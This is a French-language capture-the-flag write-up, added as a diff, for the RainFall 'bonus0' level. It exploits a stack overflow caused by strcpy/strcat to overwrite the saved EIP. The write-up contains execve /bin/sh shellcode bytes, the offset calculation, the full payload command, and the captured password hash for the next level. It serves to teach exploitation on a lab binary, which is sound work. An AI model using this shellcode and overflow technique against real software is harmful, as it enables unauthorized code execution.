@@ -1,0 +1,40 @@
+On peut remarquer dans le code un strcpy et un strcat, ce sont deux fonctions qui s'arretent de copier que lorsqu'ils rencontremt un '\0'.
+
+On peut remarquer que dans la fonction pp il n y a pas de leave, il remet la stack manuellement comme a l'etat initial(add    esp,0x50) puis des pops.
+Donc il impossible d'utiliser un overflow sur une adresse de cette stack.
+
+Les functions strcpy et strcat copient dans une adresse declaree dans le main !!! Donc on va overflow le EIP sauvgarde lors de l'arrivee dans le main.
+
+Tout d'abords nous devons calculer l'offset afin d'ecraser cette valeur.
+L'adresse ou on va ecricre est a l'adresse suivante : 0xbffff6d6
+L'adresse de sauvgarde de EIP est la suivante: 0xbffff70c
+	0xbffff70c - 0xbffff6d6 = 0x36 = 54
+
+dest1 	: string du premier p
+dest2 	: string du second p
+new	: string du main
+
+dest1 + 0x14 == dest2
+
+Dans p, la chaine retournee a une taille de 20, mais strcpy va copier jusqu'a qu il rencontre un '\0';
+Si la chaine1 est plus grande que 20 dest1 ne finira pas par un '\0'; Donc le strcpy va copier aussi dest2 jusqu'a trouver un '\0';
+Donc si chaine1 > 20 et chaine2 < 20 : new = dest1 + dest2;
+Puis a new1 il lui rajoute 1 " ".
+Enfin le strcat va rajouter a new1 dest2. Donc notre chaine de caractere aura une taille. l_dest1 + l_dest2 + 1 + l_dest2 = 54 + 4 (pour ecraser EIP)
+Donc Pour avoir une len > 40 il faut que notre chaine1 fasse plus de 20 si non new sera : l_dest1 + 1 + ldest2
+
+ldest1 sera de 20 (strncpy dans p).
+Calculons dest2 afin de savoir ca taille:
+	new 58 = 20 + 1 +  2 * l_dest2
+	(58 - 21) / 2 = 18.
+string2 = B * 14 + "\x\x\x\x";
+
+Go to exploit maintenant:
+	USER=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+On va rechercher l'adresse ou se trouve ce shellcode via un getenv maison:
+	bonus0@RainFall:~$ ./getenvaddr USER ./bonus0
+	USER will be at 0xbffff956
+Enfin on peut creer notre exploit, il y a deux entrees dans stdin donc il faut faire 2 pythons:
+	bonus0@RainFall:~$ (python -c 'print "a"*25';python -c 'print "B"*14 + "\x56\xf9\xff\xbfA"' ;cat -) | ./bonus0
+	cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
